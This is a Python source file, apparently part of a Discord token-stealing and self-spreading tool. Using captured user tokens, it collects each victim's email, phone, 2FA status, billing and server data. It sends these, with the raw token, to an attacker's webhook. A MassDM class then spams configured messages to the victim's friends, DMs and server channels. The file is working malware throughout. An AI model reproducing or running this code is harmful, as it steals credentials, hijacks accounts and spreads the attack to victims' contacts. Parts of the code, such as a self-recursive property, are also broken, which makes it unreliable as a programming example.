# from discord_webhook import AsyncDiscordWebhook, DiscordEmbed
from http.client import HTTPException
from discord import NotFound, Webhook, Embed
import discord
import config
import asyncio
from colorama import Fore
from datetime import datetime
import aiohttp
import random
import os
from enum import Enum

async def get_headers(token, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",      
    }
    if token:
        headers.update({"Authorization": token})
    return headers

async def get_details(token):
    async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me", headers=await get_headers(token)) as resp:
        data = await resp.json()
        if not data['phone']:
            data['phone'] = False
        return data
            
async def get_relationships(token):
    async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me/relationships", headers=await get_headers(token)) as resp:
        data = await resp.json()
        return len(data)

async def get_guilds(token):
    async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me/guilds?with_counts=true", headers=await get_headers(token)) as resp:
        return await resp.json()
    
async def get_payment(token):
    async with aiohttp.request("GET", "https://discordapp.com/api/users/@me/billing/payment-sources", headers=await get_headers(token)) as resp:
        return await resp.json()

async def get_roles(token, guild_id):
    async with aiohttp.request("GET", f"https://discordapp.com/api/guilds/{guild_id}/roles", headers=await get_headers(token)) as resp:
        return await resp.json()

async def parse_payment(payment):
    if payment:
        for pm in payment:
            if 'invalid' in pm: #if there is invalid a pm exists
                if pm['invalid'] == False: 
                    return True
    return False   


async def capture_owned_guilds(guilds):
    owned_guilds = []
    for guild in guilds:
        if guild["owner"]:
            owned_guilds.append(guild)
    return owned_guilds

async def generate_embed(user):
    guilds = await get_guilds(user.token)
    owned_guilds = await capture_owned_guilds(guilds)
    
    embed = Embed()

    embed.set_author(name=f"{user.details['username']}#{user.details['discriminator']}:{user.details['id']}", icon_url=f"https://cdn.discordapp.com/avatars/{user.details['id']}/{user.details['avatar']}.webp?size=128")
    embed.add_field(name='Token',         value=user.token, inline=False)
    embed.add_field(name='Email',         value=user.email, inline=False)
    embed.add_field(name='Phone',         value=user.phone, inline=False)
    embed.add_field(name='2FA',           value=user.details["mfa_enabled"])
    embed.add_field(name='Nitro',         value=user.nitro)
    embed.add_field(name='Billing',       value=user.valid_payment)
    embed.add_field(name='Relationships', value=await get_relationships(user.token))
    embed.add_field(name='Guilds',        value=len(guilds))
    embed.add_field(name='Owned Guilds',  value=len(owned_guilds))

    embed.set_footer(text=f"screen: [{config.screensess}] server: [{user.logged_from}]")
    for guild in owned_guilds:
        pass
        # embed.add_embed_field(name=guild['name'], value=f"{guild['approximate_member_count']} Members", inline=False)
    return embed


async def send_webhook(user):
    async with aiohttp.ClientSession() as session:  
        
        webhook = Webhook.from_url(config.config["webhook_url"], session=session)
        embed = await generate_embed(user)
        try:
            await webhook.send(embed=embed)
        except HTTPException:
            print(f'{Fore.RED}[Error] HTTPException Failed to send to webhook.')
        except NotFound:
            print(f'{Fore.RED}[Error] Notfound Failed to send to webhook.')
        except TypeError:
            print(f'{Fore.RED}[Error] TypeError Failed to send to webhook.')



async def send_friend_request(token, user):
    payload = {
        "username": user[0],
        "discriminator": user[1]
    }
    async with aiohttp.request("POST", "https://discord.com/api/v9/users/@me/relationships", json=payload, headers=await get_headers(token)) as resp:
        pass


class MassDM:

    async def init(self, token, name):
        self.token = token
        self.headers = await self.get_headers(token)
        self.name = name #for printing
        self.msg_index = 0

    @property
    def msg_index(self):
        current = self.msg_index

        self.msg_index = self.msg_index + 1
        if self.msg_index == len(config.config["auto_spread"]["messages"]):
            self.msg_index = 0
        return current     

    async def get_headers(self, token, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",      
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    
    async def get_guilds(self):
        async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me/guilds", headers=self.headers) as resp:
            return await resp.json()

    async def get_guild_channels(self, guild_id):
        async with aiohttp.request("GET", f"https://discordapp.com/api/guilds/{guild_id}/channels", headers=self.headers) as resp:
            return await resp.json()


    async def get_dms(self):
        async with aiohttp.request("GET", f"https://discord.com/api/v8/users/@me/channels", headers=self.headers) as resp:
            return await resp.json()


    async def get_relationships(self):
        async with aiohttp.request("GET", f"https://discordapp.com/api/v6/users/@me/relationships", headers=self.headers) as resp:
            return await resp.json()
        
    async def update_status(self, message):
        payload = {
            "bio": message
        }       
        async with aiohttp.request("PATCH", f"https://discord.com/api/v9/users/@me", json=payload, headers=self.headers) as resp:
            return await resp.json()

    async def compute_base_permissions(token, guild):
        if guild['is_owner']:
            return 'ALL'
        
        roles = await get_roles(token, guild['id'])
        

        

    async def message_channel(self, channel_id, message=None):
        #this is the worst function i have ever written in my entire life
        for _ in range(5):

            if not message:
                message = config.config["auto_spread"]["messages"][self.msg_index]
            payload = {
                "content": message
            }
            async with aiohttp.request("POST", f"https://discordapp.com/api/channels/{channel_id}/messages", json=payload, headers=self.headers) as resp:
                try:
                    data = await resp.json()
                except aiohttp.ContentTypeError: #cloudflare ratelimiting returns html
                    continue


                if resp.status == 200:
                    return True

                if resp.status == 401: #
                    break
            
                if resp.status == 403:
                    break

                if 'You need to verify your account in order to perform this action.' in data:
                    return 'locked'

                if 'captcha_key' in data:
                    return "captcha"

                if 'retry_after' in data:
                    if data['retry_after']/1000 > 10:
                        return "rate_limit"
                    await asyncio.sleep(data['retry_after']/1000)

                if 'Message was blocked by automatic moderation' in data:
                    return 'moderation'
                if 'code' in data:
                    if data['code'] == 50007:
                        break
                
                if 'Missing Access' in data:
                    break
                
                if 'id' in data:
                    return True
            

                


    async def open_dm(self, recipient):
        payload = {"recipients": [recipient]} #[] because its an array just only 1 element, this endpoint designed to support multiple people
        async with aiohttp.request("POST", f"https://discord.com/api/users/@me/channels", headers=self.headers, json=payload) as resp:
            data = await resp.json()
            return data['id']
    
    async def close_dm(self, dm_id):
        async with aiohttp.request("DELETE", f"https://discord.com/api/v8/channels/{dm_id}", headers=self.headers):
            return

    async def message_friends(self):
        for relationship in await self.get_relationships():
            if not 'type' in relationship: #check if any relationships
                return

            if relationship['type'] == 1:
                dm_id = await self.open_dm(relationship['id'])
                resp = await self.message_channel(dm_id)
                if resp == "captcha":
                    return
                if resp == "rate_limit":
                    return
                if resp == "locked":
                    return
                if resp == "moderation":
                    return
                await self.close_dm(dm_id)
                if resp == True:
                    print(f'{Fore.BLUE}[MassDM] [USER:{self.name}] [FRIEND:{relationship["user"]["username"]}#{relationship["user"]["discriminator"]}]')


    
    async def message_dms(self):
        for dm in await self.get_dms():
            if not 'id' in dm: # check if any dms
                return

            resp = await self.message_channel(dm['id'])
            if resp == "captcha":
                return
            if resp == "rate_limit":
                return
            if resp == "locked":
                return
            if resp == "moderation":
                return
            await self.close_dm(dm['id'])
            if resp == True:
                print(f'{Fore.BLUE}[MassDM] [USER:{self.name}] [DM:{len(dm["recipients"])}]')



    async def message_guilds(self):

        for guild in await self.get_guilds():
            if not 'id' in guild: #check if any guilds
                return
            if guild['id'] in config.config['servers']:
                continue
            # self.update_status(random.choice(config.config["auto_spread"]["messages"]))

            for channel in await self.get_guild_channels(guild['id']):
                if not 'type' in channel: #check if any channels
                    return

                if channel['type'] == 0:
                    resp = await self.message_channel(channel['id'])
                    if resp == "captcha":
                        return
                    if resp == "rate_limit":
                        return
                    if resp == "locked":
                        return
                    if resp == "moderation":
                        return
                    if resp == True:
                        print(f'{Fore.BLUE}[MassDM] [USER:{self.name}] [GUILD:{guild["name"]}] [CHANNEL:{channel["name"]}]')

                    
        